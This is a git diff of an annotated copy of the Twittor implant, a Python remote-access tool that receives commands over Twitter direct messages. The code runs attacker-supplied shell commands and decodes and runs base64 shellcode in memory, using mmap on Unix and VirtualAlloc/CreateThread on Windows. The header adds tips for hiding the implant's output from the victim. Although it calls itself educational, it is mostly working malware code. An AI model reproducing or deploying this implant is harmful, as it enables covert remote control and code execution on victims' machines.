@@ -5,8 +5,13 @@
     www.github.com/PaulSEc/twittor/
 
     Basically annotated version of implant.py of the above project for eductional purposes,
-    and added a few new personal additions
+    and added a few new personal additions:
+        1. shellcode injection in unix systems
+
+    Things to improve on: 
+        1. a real malicious user would turn off all output message to victim, and pass on all exceptions to keep the script running
     
+
 
 """
 #################################################################################################################################################
@@ -23,14 +28,13 @@ import threading                                                # for cocurrent 
 import subprocess                                               # for executing bash commands
 import base64                                                   # for base64 encoding purpose
 import platform                                                 # for ping service
-import sys
-import os
-import pdb
-import mmap
+import sys                                                      # for system implementations
+import os                                                       # for bash commands execution, and low level system implementations
+import mmap                                                     # for memory allocation in unix systems
 
 ##################################################################################################################################################
 
-# global variables
+# mac_getter function for global config operations
 def mac_getter():
     """
         params None:
@@ -48,7 +52,9 @@ def mac_getter():
 
     return mac                                              # returning it back to the config dict
 
+##################################################################################################################################################
 
+# global variables
 __API__ = None
 
 __CONFIG__ = {                                                                          # configuration dict, could be exported from config file
@@ -157,7 +163,7 @@ class CommandToExecute:
             return tuple: tuple of jobid, command
         
         """
-        return self.jobid, self.cmd
+        return self.jobid, self.cmd                     # returning tuple of job ID and command
 
 #------------------------------------------------------------------------------------------------------------------------------------------------#
 
@@ -232,20 +238,17 @@ class ExecuteShellcode(threading.Thread):
         
         """
     
-        if os.name == 'posix':                                          # for unix systems
+        if os.name == 'posix':                                              # for unix systems
             try:
                 try:
-                    libc = ctypes.CDLL('libc.so.6', use_errno=True)     # satisfies most linux distros
+                    libc = ctypes.CDLL('libc.so.6', use_errno=True)         # satisfies most linux distros, errno is for debugging purposes
                 except:
-                    libc = ctypes.CDLL('libc.dylib', use_errno=True)    # for darwin kernels aka osx
-		print "after lib loading, before shellcode appointing"
-                size = len(self.shellcode)                                   # size of our shellcode payload
-                #page_size = ctypes.pythonapi.getpagesize()
+                    libc = ctypes.CDLL('libc.dylib', use_errno=True)        # for darwin kernels aka osx
+                size = len(self.shellcode)                                  # size of our shellcode payload
     
                 # create pointer for shellcode
-                sc_ptr = ctypes.c_char_p(self.shellcode)                                                 # pointer to shellcode    
+                sc_ptr = ctypes.c_char_p(self.shellcode)                                            # pointer to shellcode    
                 
-		print "after shellcode appoint, before space allocation and appointing"
                 # allocating executable space
                 current_fd = os.open(__file__, os.O_RDWR)                                           # current script's file descriptor
                 protection = mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
@@ -254,11 +257,8 @@ class ExecuteShellcode(threading.Thread):
                 # create pointer for allocated space                                                # differs from main thread's memory space
                 free_space_ptr = (ctypes.c_char * size).from_buffer(free_space)                     # generating ptr from freespace buffer
     
-		print "after space allcoation and appointing, before memmove"
                 ctypes.memmove(free_space_ptr, sc_ptr, size)                                        # copying sc ptr to free space ptr 
-		print "after memmove, before cast"
                 run = ctypes.cast(free_space_ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))                # casting the allocated and copied shellcode
-		print "after cast, before run"
                 run()                                                                               # running shellcode
     
                 self.unix_exit(current_fd, free_space)
@@ -266,20 +266,17 @@ class ExecuteShellcode(threading.Thread):
             except Exception as e:
                 raise ShellcodeExecException('Error when running shellcode on unix systems', e)
     
-        else:                                                                               # for windows system
+        else:                                                                                   # for windows system
             try:
                 
-                print 'before the crash bytearray'   
-                shellcode = bytearray(self.shellcode)                                            # converting shellcode into bytes
-                print 'after the crash bytearray'
-                size = len(self.shellcode)                                                       # length of shellcode
+                shellcode = bytearray(self.shellcode)                                           # converting shellcode into bytes
+                size = len(self.shellcode)                                                      # length of shellcode
 
 
                 
                 # creating a ctypes buffer pointer for shellcode
                 sc_ptr = (ctypes.c_char * size).from_buffer(shellcode)                      # similar to ctypes.c_char_p(shellcode) in unix
 
-                print 'created buffer pointer for shellcode, but still before allocating free space'
                 
                 # allocating the space for shellcode bytes to be executed
                 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),      # null pointer constant value for starting address to allocate
@@ -288,35 +285,30 @@ class ExecuteShellcode(threading.Thread):
                         ctypes.c_int(0x40))                                     # enable rwx access to the commited region
                 freespace_ptr = ctypes.c_int(ptr)                               # pointer to the allocated space
 
-                print 'created freespace for execution and got a pointer pointing at it'
     
     
                 # move the converted buffer to the reserved and commited process memory space (similar to memmove in unix)
                 ctypes.windll.kernel32.RtlMoveMemory(freespace_ptr, sc_ptr, ctypes.c_int(size))      
 
-                print 'after copying shellcode buf to free space buf, before shellcode executional call'
                 # create and start executing the thread from the reserved memory pointer location
                 thread_handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),                # null for pointer to security attr
                         ctypes.c_int(0),                                        # initial size of stack, 0 is for new thread
-                        ctypes.c_int(ptr),                            # pointer to the location that we start executing for new thread 
+                        ctypes.c_int(ptr),                                      # pointer to the location that we start executing for new thread 
                         ctypes.c_int(0),                                        # null for pointer for params passed to thread
                         ctypes.c_int(0),                                        # 0 for creation flag, thread runs immediately after creation 
                         ctypes.pointer(ctypes.c_int(0)))                        # pointer to an int location to store thread id
                                                                                 # thread_handle is returned in the end
 
-                print 'after  executional call, and before waiting'
                 # block execution until thread is finished executing
                 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread_handle), ctypes.c_int(-1))       # non 0 value, aka -1 for wait
 
-                print 'after waiting'
                 self.wind_exit(ptr, size)                                                                       # releasing memory
                 
             except Exception as e:
-                print "Error in executing the shellcode in windows system ", e
-           #     raise ShellcodeExecException("Error in executing the shellcode in windows system", e)
-                pass
+                raise ShellcodeExecException("Error in executing the shellcode in windows system", e)
     
     # these methods will only be called if payload exit func=None
+    #NOTE: metasploit 4.16 exitfunc=none does not work, so below functions never get called, and this script is exited 
     def wind_exit(self, mem_toflush, size):
         """
             param1 obj: self object
@@ -380,9 +372,7 @@ class ExecuteCommand(threading.Thread):
         global __CONFIG__                           # globals we need
         global __API__
 
-	print "hello im inside ExecuteCommand.run, just after global declarations"
         if self.command == 'PING':                  # if our command is ping, lets return all of host machine's info
-	    print "hello im inside ExecuteCommand.run, just after if self.command=='PING'"
             output = platform.platform()
         else:   # redirect stde to stdo so it is part of output, and having a pipe to stdin so we can give it cmdline params/file if needed
 	    self.command = " ".join(self.command)				# make sure the list is joint before processing
@@ -414,7 +404,6 @@ class StdOutListener(StreamListener):
             return bool: True for keeping alive 
         
         """
-	print "Hello world we are in on_data method of userstream"
         try:
             data = json.loads(raw_data)                                                             # deserialzes data containin JSON format
 
@@ -425,20 +414,19 @@ class StdOutListener(StreamListener):
                     
                     if (cmd.is_for_me()):                                                       # using method to confirm and to take care of ping
                         jobid, cmd = cmd.retrieve_command()                                     # then we retrieve command
-			if isinstance(cmd, list):
-			    ExecuteCommand(jobid, cmd)
-                        elif (cmd.split(' ')[0] == 'shellcode'):                                  # if cmd is shellcode
-                            sc = base64.b64decode(cmd.split(' ')[1]).decode('string_escape')   # decoding our shell code using b64 and decode
-                            ExecuteShellcode(jobid, sc)                                     # execute shell code using E.S.C. class
-                        else:                                                               # if cmd is bash command instead 
+			if isinstance(cmd, list):                                               # if master command is in list form, for sh cmds
+			    ExecuteCommand(jobid, cmd)                                          # execute with E.C. class
+                        elif (cmd.split(' ')[0] == 'shellcode'):                                # if cmd is shellcode
+                            sc = base64.b64decode(cmd.split(' ')[1]).decode('string_escape')    # decoding our shell code using b64 and decode
+                            ExecuteShellcode(jobid, sc)                                         # execute shell code using E.S.C. class
+                        else:                                                                   # if cmd is bash command instead, ping purposes
 			    ExecuteCommand(jobid, cmd)						# execute it with E.C. class
 			
-                except Exception as e :                                                     # err if we cant parse and execute cmd
+                except Exception as e :                                                         # err if we cant parse and execute cmd
                     raise TwittorStreamException("Error in parsing command in stdOutListener", e)
 
         except Exception as e:
-#            raise TwittorStreamException("Error in loading, and decoding message: %s" %raw_data, e)
-	     print "Did not manage to decode %s" %raw_data 
+            raise TwittorStreamException("Error in loading, and decoding message: %s" %raw_data, e)
 
 #        return True                                         # return true to keep the stream alive, aka keep listening, otherwise false to kill
                                                             # this alters self.running property, which is checked throughout the class methods
@@ -446,14 +434,13 @@ class StdOutListener(StreamListener):
 
 #################################################################################################################################################
 
-# function definitions
+# function definition
 def main():
     """
         params: none
         return None: responsible for handling authentication with twittor api, and setting up stream
     
     """
-#    pdb.set_trace()
     global __API__
     global __CONFIG__
 
@@ -470,29 +457,8 @@ def main():
         stream = Stream(auth, StdOutListener())                             # initiating listening stream, and passing in stream obj with auth  
         stream.userstream()                                                 # starting user stream for user functionality listening stream
                                                                             # caution, this is a blocking call
-        #while True:
-        #    pass
     except Exception as e:
         raise TwittorException("Error in main()", e)
-
-#------------------------------------------------------------------------------------------------------------------------------------------------#
-
-def mac_getter():
-    """
-        params None:
-        return string: mac address of minion
-    
-    """
-    mac = None
-    mac_list = []
-    mac_string = "%012X" % (get_mac())                      # using uuid's getnode as ge_mac to get host machine's mac in string
-    
-    for i in range(0,12,2):                                 # using a for loop to split the string up to two char per element
-        mac_list.append(mac_string[i:i+2])
-
-    mac = ":".join(mac_list)                                # then joining them with : like in regular mac addresses
-
-    return mac                                              # returning it back to the config dict
 
 
 ##################################################################################################################################################
